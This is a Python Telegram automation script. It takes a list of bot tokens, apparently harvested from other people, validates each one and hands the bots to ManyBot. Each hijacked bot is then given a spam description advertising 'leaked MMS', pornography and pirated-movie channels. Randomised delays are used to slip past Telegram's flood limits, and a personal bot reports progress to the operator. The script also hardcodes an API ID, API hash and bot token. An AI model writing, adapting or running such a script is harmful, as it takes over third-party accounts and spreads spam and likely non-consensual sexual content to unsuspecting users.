import asyncio
import logging
import re
import random
import time
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, FloodWaitError, ApiIdInvalidError, MessageTooLongError

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Your Telegram API credentials
API_ID = '24955235'
API_HASH = 'f317b3f7bbe390346d8b46868cff0de8'

# Path to the file containing bot tokens
TOKEN_FILE = r'combined_output2.txt'
# Path to the file for storing successful bots
SUCCESSFUL_BOTS_FILE = r'successful_bots.txt'
# Manybot Bot username
Manybot_BOT = '@ManyBot'
# Your personal bot token
PERSONAL_BOT_TOKEN = '6836105234:AAFYHYLpQrecJGMVIRJHraGnHTbcON3pxxU'
# Your user ID for notifications
YOUR_USER_ID = 1837294444  # Replace with your actual Telegram user ID

# Statistics
stats = {
    'tokens_uploaded': 0,
    'flood_wait_time': 0,
    'total_bots_uploaded': 0,
    'total_tokens': 0
}

# Set to store processed tokens
processed_tokens = set()

def extract_bot_token(line):
    match = re.search(r'\d+:[A-Za-z0-9_-]+', line)
    return match.group(0) if match else None

def load_successful_tokens():
    try:
        with open(SUCCESSFUL_BOTS_FILE, 'r', encoding='utf-8') as file:
            return {line.split('|')[0].strip(): line.split('|')[1].strip() for line in file if '|' in line}
    except FileNotFoundError:
        logger.info(f"Successful bots file not found: {SUCCESSFUL_BOTS_FILE}")
        return {}

async def validate_token(token):
    try:
        bot = TelegramClient(f'bot_session_{token}', API_ID, API_HASH)
        await bot.start(bot_token=token)
        me = await bot.get_me()
        await bot.disconnect()
        return True
    except ApiIdInvalidError:
        logger.error(f"Invalid API ID or API Hash")
        return False
    except Exception as e:
        logger.error(f"Error validating token {token[:10]}...: {str(e)}")
        return False

async def connect_to_Manybot(client, token):
    try:
        logger.info("Opening Manybot...")
        await client.send_message(Manybot_BOT, '/start')
        await asyncio.sleep(random.uniform(2, 3))
        logger.info("Sending /addbot command...")
        await client.send_message(Manybot_BOT, '/addbot')
        await asyncio.sleep(random.uniform(2, 3))

        # Wait for the confirmation message
        async for message in client.iter_messages(Manybot_BOT, limit=1):
            if "Go to @BotFather" in message.text:
                logger.info("Received instructions from Manybot")
                break

        logger.info(f"Sending bot token: {token[:10]}...")
        await client.send_message(Manybot_BOT, token)
        await asyncio.sleep(random.uniform(2, 3))

        # Wait for token acceptance confirmation
        bot_username = None
        async for message in client.iter_messages(Manybot_BOT, limit=1):
            if "accepted" in message.text.lower():
                logger.info("Token accepted by Manybot")
                bot_username = re.search(r'@(\w+)', message.text)
                if bot_username:
                    bot_username = bot_username.group(1)
                    break

        if not bot_username:
            logger.warning("Failed to extract bot username")
            return False

        logger.info("Sending bot description...")
        description = """🎬 Download & Stream Your Favorite Movies 🎥
        🔗 https://t.me/+dfaega6Cygk3Mjc0
        🔗 https://t.me/+dfaega6Cygk3Mjc0
        🔥 Watch Leaked MMS, P0rn Videos, Desi Bhabhi, OYO Couples Without Ads & Verification 🔥
        🔞 https://t.me/+KEH6sHZ70ZQzOTVk
        🔞 https://t.me/+KEH6sHZ70ZQzOTVk
        💎 Premium P0rn, MMS, OYO Leaked for FREE 💎
        🔔 *Limited Seats (First 100 Requests Accepted Only)*
        🔗 https://t.me/+5gPLYksola9hZmY0
        🔗 https://t.me/+5gPLYksola9hZmY0
        🎥 Watch & Download Newly Released Movies for Free 🍿
        🔗 https://t.me/+okar7NWR04UwYjll
        🔗 https://t.me/+okar7NWR04UwYjll
        TeraBox Video Downloader Bot
        🔗 https://t.me/TeraBox_Download3r_Bot
        🔗 https://t.me/TeraBox_Download3r_Bot
        BY @NeonGhost_Network 👻"""

        await client.send_message(Manybot_BOT, description)
        await asyncio.sleep(random.uniform(2, 3))

        # Wait for final confirmation
        async for message in client.iter_messages(Manybot_BOT, limit=1):
            if "Congratulations" in message.text:
                logger.info(f"Bot @{bot_username} successfully added to Manybot")
                return bot_username

        return False

    except FloodWaitError as e:
        logger.error(f"FloodWaitError: {str(e)}. Waiting for {e.seconds} seconds.")
        stats['flood_wait_time'] += e.seconds
        await asyncio.sleep(e.seconds)
        return False

    except Exception as e:
        logger.error(f"Error connecting to Manybot: {str(e)}")
        return False

async def process_token(token, successful_tokens):
    if token in processed_tokens or token in successful_tokens:
        logger.info(f"Token {token[:10]}... already processed. Skipping.")
        return

    if not await validate_token(token):
        logger.warning(f"Invalid token: {token[:10]}... Skipping.")
        processed_tokens.add(token)
        return

    try:
        client = TelegramClient('session', API_ID, API_HASH)
        await client.start()
        logger.info(f"Processing token: {token[:10]}...")
        bot_username = await connect_to_Manybot(client, token)

        if bot_username:
            logger.info(f"Successfully processed token: {token[:10]}...")
            successful_tokens[token] = f"@{bot_username}"
            with open(SUCCESSFUL_BOTS_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{token}|@{bot_username}\n")
            stats['tokens_uploaded'] += 1
            stats['total_bots_uploaded'] += 1
            wait_time = random.uniform(30, 50)
            logger.info(f"Waiting {wait_time:.2f} seconds before processing next token...")
            await asyncio.sleep(wait_time)
        else:
            logger.warning(f"Failed to connect to Manybot for token: {token[:10]}...")
    
    except FloodWaitError as e:
        logger.error(f"FloodWaitError: {str(e)}. Waiting for {e.seconds} seconds.")
        stats['flood_wait_time'] += e.seconds
        await asyncio.sleep(e.seconds)
        additional_wait = random.uniform(1200, 1800)  # 20-30 minutes
        logger.info(f"Additional wait after flood: {additional_wait:.2f} seconds")
        await asyncio.sleep(additional_wait)

    except Exception as e:
        logger.error(f"Error processing token {token[:10]}...: {str(e)}")
    
    finally:
        if 'client' in locals() and client.is_connected():
            await client.disconnect()
        processed_tokens.add(token)

async def handle_personal_bot_commands(event, personal_bot):
    command = event.message.message.split()[0].lower()
    if command == '/stats':
        stats_message = (
            f"Tokens uploaded: {stats['tokens_uploaded']}\n"
            f"Total flood wait time: {stats['flood_wait_time']} seconds\n"
            f"Total bots uploaded: {stats['total_bots_uploaded']}\n"
            f"Total tokens in list: {stats['total_tokens']}"
        )
        await event.reply(stats_message)

    elif command == '/list_bot':
        successful_tokens = load_successful_tokens()
        bot_list = "\n".join([f"{token[:10]}...: {username}" for token, username in successful_tokens.items()])
        
        # Split the message if it's too long
        max_length = 4096  # Telegram's max message length
        messages = []

        while bot_list:
            if len(bot_list) <= max_length:
                messages.append(bot_list)
                break
            split_index = bot_list.rfind('\n', 0, max_length)
            if split_index == -1:
                split_index = max_length
            messages.append(bot_list[:split_index])
            bot_list = bot_list[split_index:].lstrip()

        for message in messages:
            try:
                await event.reply(f"List of uploaded bots:\n{message}")
            except MessageTooLongError:
                logger.error("Message too long, splitting further.")
                with open("bot_list.txt", "w") as f:
                    f.write(message)
                await personal_bot.send_file(event.chat_id, "bot_list.txt", caption="List of uploaded bots")

async def send_periodic_stats(personal_bot):
    while True:
        await asyncio.sleep(1800)  # 30 minutes
        stats_message = (
            f"Periodic Stats Update:\n"
            f"Tokens uploaded: {stats['tokens_uploaded']}\n"
            f"Total flood wait time: {stats['flood_wait_time']} seconds\n"
            f"Total bots uploaded: {stats['total_bots_uploaded']}\n"
            f"Total tokens in list: {stats['total_tokens']}"
        )
        await personal_bot.send_message(YOUR_USER_ID, stats_message)

async def run_personal_bot():
    personal_bot = TelegramClient('personal_bot_session', API_ID, API_HASH)
    await personal_bot.start(bot_token=PERSONAL_BOT_TOKEN)

    @personal_bot.on(events.NewMessage(pattern='/stats|/list_bot'))
    async def command_handler(event):
        await handle_personal_bot_commands(event, personal_bot)

    # Start periodic stats sending
    asyncio.create_task(send_periodic_stats(personal_bot))
    await personal_bot.run_until_disconnected()

async def main():
    successful_tokens = load_successful_tokens()
    logger.info(f"Loaded {len(successful_tokens)} successful tokens from {SUCCESSFUL_BOTS_FILE}")

    # Start personal bot in a separate task
    personal_bot_task = asyncio.create_task(run_personal_bot())

    try:
        with open(TOKEN_FILE, 'r', encoding='utf-8') as file:
            lines = file.readlines()
    except UnicodeDecodeError:
        with open(TOKEN_FILE, 'r', encoding='utf-8-sig') as file:
            lines = file.readlines()
    except FileNotFoundError:
        logger.error(f"Token file not found: {TOKEN_FILE}")
        return

    stats['total_tokens'] = len(lines)

    for line in lines:
        token = extract_bot_token(line.strip())
        if token:
            await process_token(token, successful_tokens)

    logger.info("Processing complete. Successfully added bots are saved in successful_bots.txt")

    # Notify user that all tokens have been processed
    personal_bot = TelegramClient('notification_bot_session', API_ID, API_HASH)
    await personal_bot.start(bot_token=PERSONAL_BOT_TOKEN)
    await personal_bot.send_message(YOUR_USER_ID, "All tokens in the list have been processed.")
    await personal_bot.disconnect()

    # Wait for personal bot task to complete (which it never will, as it runs until disconnected)
    await personal_bot_task

if __name__ == '__main__':
    asyncio.run(main())
